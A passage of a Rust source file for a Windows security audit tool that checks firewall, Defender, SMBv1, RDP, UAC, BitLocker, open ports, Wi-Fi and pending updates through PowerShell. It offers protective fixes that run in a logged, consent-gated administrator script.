//! Audit de sécurité Windows 10/11 via PowerShell (sans droits administrateur pour l'audit).

use std::fmt::Write;
use std::process::Command;

use super::{Audit, Constat, alerte, impossible, ok, score};
use crate::risk::{Niveau, info_port};
use crate::trw;
use crate::ui::{resume, tr, trf, trp};

pub const NOM: &str = "Windows";

const FIN: &str = "__SENTINEL_FIN__";

/// Exécute un script PowerShell et retourne sa sortie (UTF-8), ou `None` en cas d'échec.
/// Le script doit aller jusqu'au marqueur de fin : une sortie vide sans marqueur (PowerShell bloqué,
/// absent, ou remplacé par un bouchon comme sous Wine) n'est jamais prise pour une réponse.
pub fn ps(script: &str) -> Option<String> {
    // 60 s : un cmdlet bloqué (service Defender suspendu…) ne doit pas figer l'audit.
    ps_delai(script, 60)
}

/// Comme `ps`, avec un délai choisi : la recherche Windows Update ou winget peuvent prendre une minute ou deux.
fn ps_delai(script: &str, secondes: u64) -> Option<String> {
    let complet =
        format!("[Console]::OutputEncoding=[Text.Encoding]::UTF8; $ErrorActionPreference='Stop'; {script}; '{FIN}'");
    let r = crate::commande::lancer(
        Command::new("powershell").args(["-NoProfile", "-NonInteractive", "-Command", &complet]),
        secondes,
    )?;
    let (avant, _) = r.sortie.rsplit_once(FIN)?;
    (r.code == Some(0)).then(|| avant.trim().to_string())
}

/// Constat quand une vérification n'a pas pu se faire : on le dit, on ne conclut jamais « OK ».
pub(super) fn illisible(categorie: &'static str) -> Constat {
    impossible(
        categorie,
        tr!("PowerShell indisponible ou bloqué", "PowerShell unavailable or blocked"),
    )
}

/// Le script exécuté dans la fenêtre administrateur : chaque commande est annoncée, puis « OK » ou l'erreur.
/// Une fenêtre muette ne se distingue pas d'une fenêtre figée. Chaque étape a son try/catch : une erreur PowerShell
/// compte, comme un programme externe en échec, pour une étape ratée, et la fenêtre passe à la suivante.
fn script_admin(commandes: &[String]) -> String {
    let texte = |s: &str| s.replace('\'', "''");
    let mut script = String::from(tr!(
        "$Host.UI.RawUI.WindowTitle = 'sentinel : correction en cours'\n\
         [Console]::OutputEncoding = [Text.Encoding]::UTF8\n\
         $ErrorActionPreference = 'Stop'\n\
         Write-Host 'sentinel applique une correction.' -ForegroundColor Cyan\n\
         Write-Host 'Une étape longue (mise à jour, analyse, réparation de Windows) peut durer plusieurs minutes : son heure de début est affichée.'\n\
         $echecs = 0\n",
        "$Host.UI.RawUI.WindowTitle = 'sentinel: applying a fix'\n\
         [Console]::OutputEncoding = [Text.Encoding]::UTF8\n\
         $ErrorActionPreference = 'Stop'\n\
         Write-Host 'sentinel is applying a fix.' -ForegroundColor Cyan\n\
         Write-Host 'A long step (update, scan, Windows repair) can take several minutes: its start time is shown.'\n\
         $echecs = 0\n"
    ));
    for c in commandes {
        // Un programme externe (DISM, sfc, netsh…) en échec ne lève pas d'erreur PowerShell : seul son code de
        // retour le dit. On le lit après chaque commande (3010 = réussi, redémarrage demandé) et on continue :
        // dans « Internet ne marche plus », un netsh en échec ne doit pas empêcher de renouveler l'adresse.
        let _ = trw!(
            script,
            "Write-Host ''; Write-Host ('> ' + (Get-Date -Format 'HH:mm') + '  {}') -ForegroundColor Yellow\n$global:LASTEXITCODE = 0\ntry {{\n  {c}\n  \
             if ($LASTEXITCODE -eq 3010) {{ Write-Host '  OK (redémarrage nécessaire)' -ForegroundColor Green }}\n  \
             elseif ($LASTEXITCODE) {{ $echecs++; Write-Host \"  Échec (code $LASTEXITCODE) : voir le message ci-dessus\" -ForegroundColor Red }}\n  \
             else {{ Write-Host '  OK' -ForegroundColor Green }}\n\
             }} catch {{ $echecs++; Write-Host ('  Échec : ' + $_.Exception.Message) -ForegroundColor Red }}\n",
            "Write-Host ''; Write-Host ('> ' + (Get-Date -Format 'HH:mm') + '  {}') -ForegroundColor Yellow\n$global:LASTEXITCODE = 0\ntry {{\n  {c}\n  \
             if ($LASTEXITCODE -eq 3010) {{ Write-Host '  OK (restart needed)' -ForegroundColor Green }}\n  \
             elseif ($LASTEXITCODE) {{ $echecs++; Write-Host \"  Failed (code $LASTEXITCODE): see the message above\" -ForegroundColor Red }}\n  \
             else {{ Write-Host '  OK' -ForegroundColor Green }}\n\
             }} catch {{ $echecs++; Write-Host ('  Failed: ' + $_.Exception.Message) -ForegroundColor Red }}\n",
            texte(c)
        );
    }
    script += tr!(
        "if ($echecs) { Write-Host ''; Write-Host \"Terminé, avec $echecs étape(s) en échec.\" -ForegroundColor Red; Read-Host 'Appuie sur Entrée pour fermer'; exit 1 }\n\
               Write-Host ''; Write-Host 'Terminé.' -ForegroundColor Green; Read-Host 'Appuie sur Entrée pour fermer'; exit 0",
        "if ($echecs) { Write-Host ''; Write-Host \"Finished, with $echecs failed step(s).\" -ForegroundColor Red; Read-Host 'Press Enter to close'; exit 1 }\n\
               Write-Host ''; Write-Host 'Finished.' -ForegroundColor Green; Read-Host 'Press Enter to close'; exit 0"
    );
    script
}

/// Lance des commandes dans une fenêtre PowerShell administrateur (une demande UAC). Retourne `true` si tout a réussi.
/// Le script est écrit en clair dans un fichier .ps1 dont le chemin est affiché : on peut le lire avant
/// d'accepter la demande d'administrateur, et il reste comme trace de ce qui a été modifié.
pub fn powershell_admin(commandes: &[String]) -> bool {
    let dossier = crate::reseau::dossier_local().join("corrections");
    let chemin = dossier.join(format!(
        "correction-{}.ps1",
        chrono::Local::now().format("%Y%m%d-%H%M%S")
    ));
    let entete = trf!(
        "# Correction proposée par sentinel {} le {}.\r\n# Ce script n'est lancé qu'après ton accord (demande d'administrateur).\r\n\r\n",
        "# Fix proposed by sentinel {} on {}.\r\n# This script only runs after your consent (administrator prompt).\r\n\r\n",
        env!("CARGO_PKG_VERSION"),
        chrono::Local::now().format(tr!("%d/%m/%Y à %H:%M", "%Y-%m-%d %H:%M"))
    );
    // BOM : sans lui, Windows PowerShell 5.1 lit le fichier en ANSI et casse les accents.
    let contenu = format!("\u{feff}{entete}{}\r\n", script_admin(commandes).replace('\n', "\r\n"));
    if std::fs::create_dir_all(&dossier)
        .and_then(|()| std::fs::write(&chemin, contenu))
        .is_err()
    {
        trp!(
            "    Impossible d'écrire le script de correction dans {}",
            "    Could not write the fix script to {}",
            dossier.display()
        );
        return false;
    }
    trp!(
        "    Script de correction (lisible) : {}",
        "    Fix script (readable): {}",
        chemin.display()
    );
    let fichier = chemin.display().to_string().replace('\'', "''");
    // Demande d'administrateur refusée : Start-Process échoue et $p reste vide. Sans ce test, l'appel de méthode
    // sur $null était sauté et « exit $p.ExitCode » devenait « exit 0 » : la correction s'affichait « fait ».
    // Attente sans limite : la fenêtre est visible et attend Entrée, un délai compterait aussi le temps de lecture.
    let lanceur = trf!(
        "$p = Start-Process powershell -Verb RunAs -PassThru -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','\"{fichier}\"'; \
         if (-not $p) {{ Write-Host 'Demande d''administrateur refusée : rien n''a été modifié.'; exit 3 }}; \
         $p.WaitForExit(); \
         if ($null -eq $p.ExitCode) {{ exit 4 }}; exit $p.ExitCode",
        "$p = Start-Process powershell -Verb RunAs -PassThru -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','\"{fichier}\"'; \
         if (-not $p) {{ Write-Host 'Administrator prompt refused: nothing was changed.'; exit 3 }}; \
         $p.WaitForExit(); \
         if ($null -eq $p.ExitCode) {{ exit 4 }}; exit $p.ExitCode"
    );
    Command::new("powershell")
        .args(["-NoProfile", "-Command", &lanceur])
        .status()
        .is_ok_and(|s| s.success())
}

fn pare_feu() -> Constat {
    let Some(etat) = ps("Get-NetFirewallProfile | ForEach-Object { \"$($_.Name)=$($_.Enabled)\" }") else {
        return illisible("Pare-feu");
    };
    let profils: Vec<(&str, &str)> = etat.lines().filter_map(|l| l.trim().split_once('=')).collect();
    let off: Vec<&str> = profils
        .iter()
        .filter(|(_, v)| !v.eq_ignore_ascii_case("true"))
        .map(|(n, _)| *n)
        .collect();
    match (profils.is_empty(), off.join(", ")) {
        (true, _) => alerte(
            "Pare-feu",
            Niveau::Info,
            tr!(
                "Aucun profil de pare-feu lu (pare-feu tiers ?).",
                "No firewall profile read (third-party firewall?)."
            ),
        ),
        (false, off) if off.is_empty() => ok(
            "Pare-feu",
            tr!(
                "Pare-feu Windows actif sur tous les profils.",
                "Windows firewall on for every profile."
            ),
        ),
        (false, off) => alerte(
            "Pare-feu",
            Niveau::Eleve,
            trf!("Pare-feu désactivé pour : {off}.", "Firewall off for: {off}."),
        )
        .corriger(
            tr!(
                "Réactiver le pare-feu Windows sur tous les profils",
                "Turn the Windows firewall back on for every profile"
            ),
            &["Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True"],
        ),
    }
}

fn antivirus() -> Vec<Constat> {
    if ps("1").is_none() {
        return vec![illisible("Antivirus")];
    }
    let Some(json) = ps(
        "Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntivirusSignatureAge,IsTamperProtected | ConvertTo-Json",
    ) else {
        let tiers =
            ps("(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct).displayName -join ', '")
                .unwrap_or_default();
        return vec![if tiers.is_empty() {
            alerte(
                "Antivirus",
                Niveau::Critique,
                tr!("Aucun antivirus détecté.", "No antivirus detected."),
            )
            .manuel(
                tr!(
                    "Ouvrir Sécurité Windows et réactiver Microsoft Defender",
                    "Open Windows Security and turn Microsoft Defender back on"
                ),
                &["Start-Process windowsdefender:"],
            )
        } else {
            ok(
                "Antivirus",
                trf!("Antivirus tiers : {tiers}.", "Third-party antivirus: {tiers}."),
            )
        }];
    };
    let v: serde_json::Value = serde_json::from_str(&json).unwrap_or_default();
    if !v["RealTimeProtectionEnabled"].is_boolean() {
        return vec![illisible("Antivirus")];
    }
    let mut c = Vec::new();
    if v["RealTimeProtectionEnabled"] == false || v["AntivirusEnabled"] == false {
        c.push(
            alerte(
                "Antivirus",
                Niveau::Critique,
                tr!(
                    "Protection en temps réel de Defender désactivée.",
                    "Defender real-time protection is off."
                ),
            )
            .corriger(
                tr!(
                    "Réactiver la protection en temps réel",
                    "Turn real-time protection back on"
                ),
                &["Set-MpPreference -DisableRealtimeMonitoring $false"],
            ),
        );
    } else {
        c.push(ok(
            "Antivirus",
            tr!(
                "Microsoft Defender actif, protection en temps réel.",
                "Microsoft Defender on, real-time protection."
            ),
        ));
    }
    c.push(signatures(v["AntivirusSignatureAge"].as_u64().unwrap_or(0)));
    if v["IsTamperProtected"] == false {
        c.push(alerte("Antivirus", Niveau::Moyen, tr!("Protection contre les falsifications désactivée : un malware peut couper Defender.", "Tamper protection is off: malware can turn Defender off."))
            .manuel(tr!("Sécurité Windows > Protection contre les virus > Gérer les paramètres > Protection contre les falsifications", "Windows Security > Virus protection > Manage settings > Tamper protection"), &["Start-Process windowsdefender://threatsettings"]));
    }
    c
}

fn smb1() -> Option<Constat> {
    let actif = ps("(Get-SmbServerConfiguration).EnableSMB1Protocol")?.to_ascii_lowercase();
    if actif != "true" && actif != "false" {
        return Some(illisible("SMBv1"));
    }
    Some(if actif == "true" {
        alerte(
            "SMBv1",
            Niveau::Critique,
            tr!(
                "SMBv1 activé (exploité par WannaCry / NotPetya).",
                "SMBv1 on (exploited by WannaCry / NotPetya)."
            ),
        )
        .corriger(
            tr!("Désactiver SMBv1", "Turn SMBv1 off"),
            &["Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force"],
        )
    } else {
        ok("SMBv1", tr!("SMBv1 désactivé.", "SMBv1 off."))
    })
}

fn bureau_distance() -> Constat {
    let cle = r"HKLM:\System\CurrentControlSet\Control\Terminal Server";
    let actif = match ps(&format!("(Get-ItemProperty '{cle}').fDenyTSConnections")).as_deref() {
        Some("0") => true,
        Some("1") => false,
        _ => return illisible("Bureau à distance"),
    };
    if !actif {
        return ok(
            "Bureau à distance",
            tr!("Bureau à distance (RDP) désactivé.", "Remote Desktop (RDP) off."),
        );
    }
    let nla = ps(&format!(
        r"(Get-ItemProperty '{cle}\WinStations\RDP-Tcp').UserAuthentication"
    ))
    .is_some_and(|v| v == "1");
    let couper = format!("Set-ItemProperty '{cle}' -Name fDenyTSConnections -Value 1");
    // Session ouverte PAR le Bureau à distance (SESSIONNAME = RDP-Tcp#…) : le couper couperait l'utilisateur
    // lui-même. Jamais en correction automatique dans ce cas.
    if session_a_distance() {
        alerte("Bureau à distance", Niveau::Moyen, tr!("RDP activé ; tu es connecté par lui en ce moment.", "RDP on; you are connected through it right now.")).manuel(
            tr!("Ne pas le couper d'ici (tu perdrais la connexion). S'il n'est pas utile, le désactiver depuis l'écran de l'ordinateur : Paramètres > Système > Bureau à distance", "Do not turn it off from here (you would lose the connection). If it is not needed, turn it off from the computer's own screen: Settings > System > Remote Desktop"),
            &[],
        )
    } else if nla {
        alerte(
            "Bureau à distance",
            Niveau::Moyen,
            tr!(
                "RDP activé (avec NLA). Très attaqué s'il est exposé.",
                "RDP on (with NLA). Heavily attacked if exposed."
            ),
        )
        .corriger(
            tr!(
                "Désactiver le Bureau à distance si tu ne l'utilises pas",
                "Turn Remote Desktop off if you do not use it"
            ),
            &[&couper],
        )
    } else {
        alerte(
            "Bureau à distance",
            Niveau::Eleve,
            tr!(
                "RDP activé SANS authentification au niveau réseau (NLA).",
                "RDP on WITHOUT Network Level Authentication (NLA)."
            ),
        )
        .corriger(
            tr!("Exiger NLA pour le Bureau à distance", "Require NLA for Remote Desktop"),
            &[&format!(
                r"Set-ItemProperty '{cle}\WinStations\RDP-Tcp' -Name UserAuthentication -Value 1"
            )],
        )
    }
}

#[link(name = "user32")]
unsafe extern "system" {
    fn GetSystemMetrics(index: i32) -> i32;
}

/// Cette session Windows est-elle affichée à travers le Bureau à distance, en ce moment ?
/// On interroge Windows directement : la variable SESSIONNAME est figée à l'ouverture de session et
/// reste « Console » quand le Bureau à distance reprend une session ouverte sur l'écran (vu en test réel).
pub fn session_a_distance() -> bool {
    const SM_REMOTESESSION: i32 = 0x1000;
    // SAFETY : GetSystemMetrics n'a ni pointeur ni effet de bord.
    let distante = unsafe { GetSystemMetrics(SM_REMOTESESSION) } != 0;
    distante || std::env::var("SESSIONNAME").is_ok_and(|s| s.to_ascii_uppercase().starts_with("RDP-"))
}

fn uac() -> Constat {
    let cle = r"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
    let valeur = ps(&format!("(Get-ItemProperty '{cle}').EnableLUA"));
    if !matches!(valeur.as_deref(), Some("0" | "1")) {
        return illisible("UAC");
    }
    if valeur.as_deref() == Some("0") {
        alerte(
            "UAC",
            Niveau::Eleve,
            tr!(
                "Contrôle de compte d'utilisateur (UAC) désactivé : tout programme a les droits admin.",
                "User Account Control (UAC) is off: every program has admin rights."
            ),
        )
        .corriger(
            tr!(
                "Réactiver l'UAC (effectif après redémarrage)",
                "Turn UAC back on (effective after a restart)"
            ),
            &[&format!("Set-ItemProperty '{cle}' -Name EnableLUA -Value 1")],
        )
    } else {
        ok(
            "UAC",
            tr!("Contrôle de compte d'utilisateur actif.", "User Account Control on."),
        )
    }
}

fn mises_a_jour() -> Constat {
    let jours = ps("((Get-Date) - (Get-HotFix | Where-Object InstalledOn | Sort-Object InstalledOn -Descending | Select-Object -First 1).InstalledOn).Days")
        .and_then(|j| j.parse::<i64>().ok());
    match jours {
        Some(j) if j > 45 => alerte(
            "Mises à jour",
            Niveau::Eleve,
            trf!(
                "Dernière mise à jour Windows il y a {j} jours.",
                "Last Windows update {j} days ago."
            ),
        )
        .manuel(
            tr!(
                "Ouvrir Windows Update et installer les mises à jour",
                "Open Windows Update and install the updates"
            ),
            &["Start-Process ms-settings:windowsupdate"],
        ),
        Some(j) => ok(
            "Mises à jour",
            trf!(
                "Dernière mise à jour Windows il y a {j} jours.",
                "Last Windows update {j} days ago."
            ),
        ),
        None => impossible(
            "Mises à jour",
            tr!(
                "historique Windows Update illisible",
                "Windows Update history unreadable"
            ),
        ),
    }
}

fn chiffrement() -> Constat {
    // Lisible sans droits admin, contrairement à Get-BitLockerVolume. 1, 3 et 5 = protégé.
    let etat = ps(
        "(New-Object -ComObject Shell.Application).NameSpace('C:').Self.ExtendedProperty('System.Volume.BitLockerProtection')",
    );
    match etat.as_deref() {
        Some("1" | "3" | "5") => ok(
            "Chiffrement",
            tr!("Disque C: chiffré (BitLocker).", "Disk C: encrypted (BitLocker)."),
        ),
        Some(_) => alerte(
            "Chiffrement",
            Niveau::Moyen,
            tr!(
                "Disque C: non chiffré : en cas de vol, les données sont lisibles.",
                "Disk C: not encrypted: if stolen, the data can be read."
            ),
        )
        .manuel(
            tr!(
                "Paramètres > Confidentialité et sécurité > Chiffrement de l'appareil (ou BitLocker sur Pro)",
                "Settings > Privacy & security > Device encryption (or BitLocker on Pro)"
            ),
            &["Start-Process ms-settings:deviceencryption"],
        ),
        None => impossible(
            "Chiffrement",
            tr!("état BitLocker illisible", "BitLocker state unreadable"),
        ),
    }
}

fn ports_ecoute(pare_feu_actif: bool, ip_lan: Option<&str>) -> Vec<Constat> {
    let Some(liste) = ps(
        "Get-NetTCPConnection -State Listen | ForEach-Object { \"$($_.LocalAddress)|$($_.LocalPort)|$((Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName)\" }",
    ) else {
        return vec![illisible("Ports en écoute")];
    };
    // Ports déjà bloqués en entrée par une règle sentinel (ou netscan, l'ancien nom) active : le port écoute toujours,
    // mais n'est plus joignable.
    // Sans cette lecture, l'alerte et la même correction (une règle de plus à chaque fois) revenaient à chaque audit.
    let bloques: Vec<u16> = if pare_feu_actif {
        ps(
            "@(Get-NetFirewallRule -DisplayName 'sentinel : bloquer *','netscan : bloquer *' -ErrorAction SilentlyContinue | \
            Where-Object { $_.Enabled -eq 'True' -and $_.Action -eq 'Block' -and $_.Direction -eq 'Inbound' } | \
            Get-NetFirewallPortFilter | ForEach-Object { $_.LocalPort }) -join ','",
        )
        .unwrap_or_default()
        .split(',')
        .filter_map(|p| p.trim().parse().ok())
        .collect()
    } else {
        Vec::new()
    };
    // Ports RPC dynamiques ouverts par Windows lui-même : normaux et filtrés par le pare-feu.
    let systeme = ["svchost", "lsass", "wininit", "services", "spoolsv", "System", "Idle"];
    let mut vus = Vec::new();
    let mut constats = Vec::new();
    for l in liste.lines() {
        let mut c = l.splitn(3, '|');
        let (Some(adresse), Some(Ok(port)), programme) =
            (c.next(), c.next().map(str::parse::<u16>), c.next().unwrap_or("?"))
        else {
            continue;
        };
        let expose = matches!(adresse, "0.0.0.0" | "::") || ip_lan == Some(adresse);
        if !expose || vus.contains(&port) || (port >= 49152 && systeme.contains(&programme)) {
            continue;
        }
        vus.push(port);
        let i = info_port(port);
        if bloques.contains(&port) {
            constats.push(alerte(
                "Ports en écoute",
                Niveau::Info,
                trf!(
                    "{port}/tcp ({}) ouvert par « {programme} », bloqué en entrée par la règle « sentinel : bloquer {port} » du pare-feu Windows.", "{port}/tcp ({}) opened by “{programme}”, blocked inbound by the “sentinel : bloquer {port}” Windows firewall rule.",
                    i.service
                ),
            ));
            continue;
        }
        let niveau = super::niveau_expose(pare_feu_actif, i.niveau);
        let constat = alerte(
            "Ports en écoute",
            niveau,
            trf!(
                "{port}/tcp ({}) ouvert par « {programme} ». {}",
                "{port}/tcp ({}) opened by “{programme}”. {}",
                i.service,
                i.conseil
            ),
        );
        // RDP : pas de blocage aveugle, il coupe l'accès aux machines pilotées à distance (VM…).
        // Le constat « Bureau à distance » propose déjà NLA ou la désactivation propre.
        constats.push(if niveau >= Niveau::Moyen && port != 3389 {
            constat.corriger(
                trf!("Bloquer le port {port} en entrée dans le pare-feu Windows", "Block inbound port {port} in the Windows firewall"),
                &[&format!("New-NetFirewallRule -DisplayName 'sentinel : bloquer {port}' -Direction Inbound -Protocol TCP -LocalPort {port} -Action Block")],
            )
            .bloquant(format!("{port}/tcp"))
        } else {
            constat
        });
    }
    if constats.is_empty() {
        constats.push(ok(
            "Ports en écoute",
            tr!(
                "Aucun service TCP sensible exposé au réseau.",
                "No sensitive TCP service exposed to the network."
            ),
        ));
    }
    constats
}

fn wifi() -> Option<Constat> {
    let texte = crate::commande::lancer(Command::new("netsh").args(["wlan", "show", "interfaces"]), 15)?.sortie;
    let champ = |cle: &str| {
        texte
            .lines()
            .map(str::trim)
            .find(|l| l.starts_with(cle) && !l.starts_with("BSSID"))
            .and_then(|l| Some(l.split_once(':')?.1.trim().to_string()))
    };
    let ssid = champ("SSID")?;
    let auth = champ("Authenti")?;
    let routeur = tr!(
        "Ouvrir l'admin du routeur > Wi-Fi > Sécurité : choisir « WPA2/WPA3 » ou « WPA3 »",
        "Open the router admin > Wi-Fi > Security: choose “WPA2/WPA3” or “WPA3”"
    );
    Some(if auth.contains("WPA3") {
        ok("Wi-Fi", trf!("« {ssid} » en {auth}.", "“{ssid}” uses {auth}."))
    } else if auth.contains("WPA2") {
        alerte(
            "Wi-Fi",
            Niveau::Info,
            trf!(
                "« {ssid} » en {auth}. WPA3 serait mieux si le routeur le permet.",
                "“{ssid}” uses {auth}. WPA3 would be better if the router allows it."
            ),
        )
        .manuel(routeur, &[])
    } else {
        alerte(
            "Wi-Fi",
            Niveau::Eleve,
            trf!(
                "« {ssid} » en {auth} : réseau ouvert ou chiffrement faible.",
                "“{ssid}” uses {auth}: open network or weak encryption."
            ),
        )
        .manuel(routeur, &[])
    })
}

/// Une mise à jour proposée par Windows Update.
#[derive(Debug, PartialEq)]
struct MiseAJour {
    pilote: bool,
    /// Correctif de sécurité classé « Critique » ou « Important » par Microsoft.
    importante: bool,
    titre: String,
}

/// Lignes « type|gravité|titre » écrites par la recherche Windows Update (type 2 = pilote).
fn lire_windows_update(sortie: &str) -> Vec<MiseAJour> {
    sortie
        .lines()
        .filter_map(|l| {
            let mut champs = l.trim().splitn(3, '|');
            let (genre, gravite, titre) = (champs.next()?, champs.next()?, champs.next()?.trim());
            (!titre.is_empty()).then(|| MiseAJour {
                pilote: genre == "2",
                importante: matches!(gravite, "Critical" | "Important"),
                titre: titre.to_string(),
            })
        })
        .collect()
}

/// Commandes de la fenêtre administrateur qui téléchargent et installent les mises à jour Windows (`pilotes` =
/// false) ou les pilotes, par l'API de Windows Update, comme le bouton « Tout installer ». La recherche (jusqu'à
/// deux minutes) est gardée dans la fenêtre : installer les deux en une fois ne la refait pas.
fn installer_windows_update(pilotes: bool) -> Vec<String> {
    let genre = if pilotes { 2 } else { 1 };
    vec![
        format!(
            "$maj = New-Object -ComObject Microsoft.Update.Session; \
             if ($null -eq $trouvees) {{ $trouvees = $maj.CreateUpdateSearcher().Search('IsInstalled=0 and IsHidden=0').Updates }}; \
             $liste = New-Object -ComObject Microsoft.Update.UpdateColl; \
             foreach ($u in $trouvees) {{ if ([int]$u.Type -eq {genre}) {{ if (-not $u.EulaAccepted) {{ $u.AcceptEula() }}; \
             [void]$liste.Add($u); Write-Host \"  - $($u.Title)\" }} }}"
        ),
        // Une mise à jour non téléchargée (vu dans la VM : Windows Update bloqué sur « En attente de
        // téléchargement ») ne doit pas passer pour installée : chacune est vérifiée et nommée.
        tr!("if ($liste.Count) { $t = $maj.CreateUpdateDownloader(); $t.Updates = $liste; \
         try { [void]$t.Download() } catch { Write-Host \"  Téléchargement interrompu : $($_.Exception.Message)\" -ForegroundColor Red } }; \
         $pret = New-Object -ComObject Microsoft.Update.UpdateColl; $ko = 0; \
         foreach ($u in $liste) { if ($u.IsDownloaded) { [void]$pret.Add($u) } \
         else { $ko++; Write-Host \"  Pas téléchargée : $($u.Title)\" -ForegroundColor Red } }", "if ($liste.Count) { $t = $maj.CreateUpdateDownloader(); $t.Updates = $liste; \
         try { [void]$t.Download() } catch { Write-Host \"  Download interrupted: $($_.Exception.Message)\" -ForegroundColor Red } }; \
         $pret = New-Object -ComObject Microsoft.Update.UpdateColl; $ko = 0; \
         foreach ($u in $liste) { if ($u.IsDownloaded) { [void]$pret.Add($u) } \
         else { $ko++; Write-Host \"  Not downloaded: $($u.Title)\" -ForegroundColor Red } }")
            .into(),
        // L'API installe sans prévenir le service du panneau Paramètres (UsoSvc) : sans StartScan, il garde sa
        // liste d'avant, « En attente de téléchargement », même après un redémarrage (vu dans la VM).
        tr!("$r = $null; if ($pret.Count) { $i = $maj.CreateUpdateInstaller(); $i.Updates = $pret; $r = $i.Install(); \
         try { UsoClient StartScan } catch {}; $global:LASTEXITCODE = 0 }; \
         if ($r) { for ($n = 0; $n -lt $pret.Count; $n++) { $code = $r.GetUpdateResult($n).ResultCode; \
         if ($code -eq 2) { Write-Host \"  Installée : $($pret.Item($n).Title)\" -ForegroundColor Green } \
         else { $ko++; Write-Host \"  Pas installée (code $code) : $($pret.Item($n).Title)\" -ForegroundColor Red } } }; \
         if ($r -and $r.RebootRequired) { Write-Host '  Redémarrage nécessaire pour finir.' -ForegroundColor Yellow }; \
         if ($ko) { throw \"$ko mise(s) à jour à refaire plus tard (ou Paramètres > Windows Update)\" }", "$r = $null; if ($pret.Count) { $i = $maj.CreateUpdateInstaller(); $i.Updates = $pret; $r = $i.Install(); \
         try { UsoClient StartScan } catch {}; $global:LASTEXITCODE = 0 }; \
         if ($r) { for ($n = 0; $n -lt $pret.Count; $n++) { $code = $r.GetUpdateResult($n).ResultCode; \
         if ($code -eq 2) { Write-Host \"  Installed: $($pret.Item($n).Title)\" -ForegroundColor Green } \
         else { $ko++; Write-Host \"  Not installed (code $code): $($pret.Item($n).Title)\" -ForegroundColor Red } } }; \
         if ($r -and $r.RebootRequired) { Write-Host '  Restart needed to finish.' -ForegroundColor Yellow }; \
         if ($ko) { throw \"$ko update(s) to retry later (or Settings > Windows Update)\" }")
            .into(),
    ]
}

/// Ce que Windows Update propose et qui n'est pas installé : correctifs (Windows, .NET, Defender) et pilotes.
fn windows_update() -> Vec<Constat> {
    let Some(sortie) = ps_delai(
        // La mise à jour cumulative de sécurité arrive souvent sans gravité (vu dans la VM) : sa catégorie
        // « Mises à jour de sécurité » (identifiant fixe, quelle que soit la langue) la classe alors « Important ».
        "foreach ($u in (New-Object -ComObject Microsoft.Update.Session).CreateUpdateSearcher().Search('IsInstalled=0 and IsHidden=0').Updates) \
         { $g = $u.MsrcSeverity; foreach ($c in $u.Categories) { if (-not $g -and $c.CategoryID -eq '0fa1201d-4330-4fa8-8ae9-b877473b6441') { $g = 'Important' } }; \
         \"$([int]$u.Type)|$g|$($u.Title)\" }",
        180,
    ) else {
        return vec![
            impossible(
                "Windows Update",
                tr!("recherche impossible, hors ligne ?", "search failed, offline?"),
            ),
            impossible(
                "Pilotes",
                tr!("recherche Windows Update impossible", "Windows Update search failed"),
            ),
        ];
    };
    let (pilotes, logiciels): (Vec<_>, Vec<_>) = lire_windows_update(&sortie).into_iter().partition(|m| m.pilote);
    vec![
        constat_windows_update(
            "Windows Update",
            tr!(
                "Windows à jour (correctifs, .NET, Defender).",
                "Windows up to date (fixes, .NET, Defender)."
            ),
            tr!("mise(s) à jour en attente", "update(s) pending"),
            tr!(
                "Télécharger et installer les mises à jour de Windows",
                "Download and install the Windows updates"
            ),
            false,
            &logiciels,
        ),
        constat_windows_update(
            "Pilotes",
            tr!(
                "Aucun pilote à mettre à jour dans Windows Update.",
                "No driver to update in Windows Update."
            ),
            tr!("pilote(s) à mettre à jour", "driver(s) to update"),
            tr!(
                "Installer les pilotes proposés par Windows Update",
                "Install the drivers offered by Windows Update"
            ),
            true,
            &pilotes,
        ),
    ]
}

/// « À jour », ou la liste des mises à jour (ou des pilotes) avec leur installation.
fn constat_windows_update(
    categorie: &'static str,
    a_jour: &str,
    quoi: &str,
    action: &str,
    pilotes: bool,
    liste: &[MiseAJour],
) -> Constat {
    if liste.is_empty() {
        return ok(categorie, a_jour);
    }
    let niveau = if liste.iter().any(|m| m.importante) {
        Niveau::Eleve
    } else {
        Niveau::Moyen
    };
    let titres: Vec<&str> = liste.iter().map(|m| m.titre.as_str()).collect();
    alerte(
        categorie,
        niveau,
        trf!(
            "{} {quoi} : {}.",
            "{} {quoi}: {}.",
            liste.len(),
            resume(&titres, 3, tr!(" ; ", "; "))
        ),
    )
    .corriger(action, &installer_windows_update(pilotes))
}

/// Les quatre petites lectures de `sentinel maj` (redémarrage, signatures, périphériques, cartes graphiques) en un
/// seul PowerShell : une seconde de démarrage au lieu de quatre. Chaque section a son try et se termine par
/// « NOM_FIN » : une lecture qui échoue (Defender remplacé par un antivirus tiers…) ne prive pas les autres.
fn lectures_rapides() -> Option<String> {
    ps(
        "try { 'REB|' + [bool]((New-Object -ComObject Microsoft.Update.SystemInfo).RebootRequired -or \
         (Test-Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing\\RebootPending')); 'REB_FIN' } catch {}; \
         try { 'SIG|' + (Get-MpComputerStatus).AntivirusSignatureAge; 'SIG_FIN' } catch {}; \
         try { Get-CimInstance Win32_PnPEntity -Filter 'ConfigManagerErrorCode <> 0 AND ConfigManagerErrorCode <> 22' | \
         ForEach-Object { \"PNP|$($_.ConfigManagerErrorCode)|$(if ($_.Name) { $_.Name } else { $_.PNPDeviceID })\" }; 'PNP_FIN' } catch {}; \
         try { Get-CimInstance Win32_VideoController | ForEach-Object { \
         \"GPU|$($_.Name)|$($_.DriverVersion)|$(if ($_.DriverDate) { ((Get-Date) - $_.DriverDate).Days })\" }; 'GPU_FIN' } catch {}",
    )
}

/// Lignes d'une section de `lectures_rapides`, sans leur préfixe ; `None` si la section n'a pas pu être lue.
fn section<'a>(sortie: Option<&'a str>, nom: &str) -> Option<Vec<&'a str>> {
    let sortie = sortie?;
    let fin = format!("{nom}_FIN");
    sortie.lines().any(|l| l.trim() == fin).then(|| {
        sortie
            .lines()
            .filter_map(|l| l.trim().strip_prefix(nom)?.strip_prefix('|'))
            .collect()
    })
}

fn redemarrage_en_attente(lectures: Option<&str>) -> Constat {
